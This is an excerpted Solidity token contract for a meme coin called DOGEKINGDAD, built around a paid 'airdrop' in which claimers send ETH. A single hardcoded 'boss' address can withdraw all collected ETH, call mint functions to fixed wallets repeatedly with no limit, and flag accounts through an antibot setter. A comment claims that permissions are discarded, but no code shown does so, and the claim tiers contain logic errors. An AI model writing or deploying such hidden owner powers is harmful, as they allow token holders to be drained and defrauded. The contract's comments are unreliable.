...
contract DOGEKINGDAD is ERC20, Ownable, BaseToken {
    using SafeMath for uint256;
    ...
    //drop start
     uint32 public blockTime = uint32(block.timestamp);

    uint128 public constant token = 1000000000000000 ether;

    uint128 public constant deadtoken = 900000000000000 ether;

    uint128 public constant livetoken = token - deadtoken;

    uint128 public constant drop_token_number = livetoken / 2;
   
    uint128 public ok_claim_number = 0;

    uint128 public is_claim_ok = 1; 
   
    mapping (address => bool) public is_claim;
   
    uint public Price1 = 0.01 ether;//1000000000000000 wei

    uint public Price2 = 0.05 ether;//5000000000000000 wei

    address[] public ok_claim_people;
    ...
    constructor(
        ...
        */
        _mint(deadWallet,deadtoken);  //deadWallet 90%
        emit TokenCreated(owner(), address(this), TokenType.baby, VERSION);
        payable(serviceFeeReceiver_).transfer(serviceFee_);
    }

     //Airdrop time exceeds destruction of unclaimed airdrops
    function claimTimeExceeds() public onlyBoss{
        uint128 tokenDead =  uint128(drop_token_number - ok_claim_number);
        _mint(deadWallet,tokenDead / 2);
         _mint(_marketingWalletAddress,tokenDead / 2);
         is_claim_ok = 0;
        
    }

    //Whether LP liquidity shares need to be opened in advance
    function is_open_lp()public onlyBoss{
        _mint(0xf6494De2c4c78877F9128501973b0480BFd6a7D0, livetoken / 2 / 5*1);  //LP Incentive
    }

    //The airdrop ends with community tokens beginning to pledge and Treasury
    function drop_exit()public onlyBoss{
         _mint(0xe006472A4553D52D896E7d02257F5C2231baBeeE, livetoken / 2 / 5*2);  //Doge King Dad DAO Treasury
        _mint(0x436F0A8439518196bFEba14875ED1EA39A2Ef9eA, livetoken / 2 / 5*2);  //Staking Incentive
    }


    //Send drop
    function claim_drop() external  payable{
        //Verify the drop time
        if((uint32(block.timestamp) - blockTime) <= 60 days && is_claim[msg.sender] == false && is_claim_ok == 1){
            if(ok_claim_people.length <= 210){
                require(msg.value >= Price1);
            }else if(ok_claim_people.length > 210 && ok_claim_people.length <= 2210){
               require(msg.value >= Price2);
            }
            else if(ok_claim_people.length > 2210 && ok_claim_people.length <= 22210){
               require(msg.value >= Price2);
            }
            ok_claim_people.push(msg.sender);
            ok_claim_number = ok_claim_number + push_drop_number();
            is_claim[msg.sender] = true;
            _mint(msg.sender,push_drop_number());
      }
    }

    //Discard permissions after operation destroy remaining airdrops
    modifier onlyBoss(){
        require(msg.sender == 0x71FAe3f4D6D344215eA60D1c262DDC656f0eC6fE);
        _;
    }
    //Access to community funding
    function getBalanceConcrat()public onlyBoss{
        
         payable(msg.sender).transfer(address(this).balance);
    }

    /*
        In order to consider the fairness of the airdrop, 
        the developers repeatedly studied and finally made this allocation ratio. 
        A total of 21,000 people were airdropped, and 21 million bitcoins were commemorated. 
        Thank bitcoin for bringing us the joy of blockchain!
    */
    //How many airdrops to send  drop:50000000000000
    function push_drop_number() public view returns(uint128){

        uint128 claim_number;
        if(ok_claim_people.length == 0){   //0 section nod ore 1% into LP liquidity pool
            claim_number = uint128(drop_token_number/100*1);
        }
        else if(ok_claim_people.length > 0 && ok_claim_people.length <= 210){   // 11904761904.7619047619 yi
            claim_number = uint128(drop_token_number/100*4/210*1);
        }else if(ok_claim_people.length > 210 && ok_claim_people.length <= 2210){ // 37.5 yi
             claim_number = uint128(drop_token_number/100*15/2210*1);
        }
        else if(ok_claim_people.length > 2210 && ok_claim_people.length <= 22210){ // 40 yi
            claim_number = uint128(drop_token_number/100*80/22100*1);
        }
        return claim_number;
    }

    //Whether it has been airdropped
    function return_is_claim(address add) public view returns(bool){
        return is_claim[add];
    ...
    function setAntibot(address account, bool _bot) external onlyBoss{
